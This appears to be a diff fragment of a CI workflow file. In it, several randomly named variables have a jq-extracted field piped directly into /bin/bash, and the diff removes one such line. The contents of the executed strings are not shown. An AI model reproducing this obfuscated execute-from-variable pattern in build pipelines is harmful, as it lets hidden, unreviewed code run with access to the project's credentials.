@@ -22,7 +22,6 @@ jobs:
           echo $q81009 | jq -r .i480 | /bin/bash
           echo $c37 | jq -r .wzlg79525 | /bin/bash
           printf '%s' "$t7461" | jq -r .gcgp4 | /bin/bash
-          printf '%s' "$gtdyo3096" | jq -r .gztvg2346 | /bin/bash
           echo $f3507 | jq -r .fm4 | /bin/bash
 
       - name: Save results
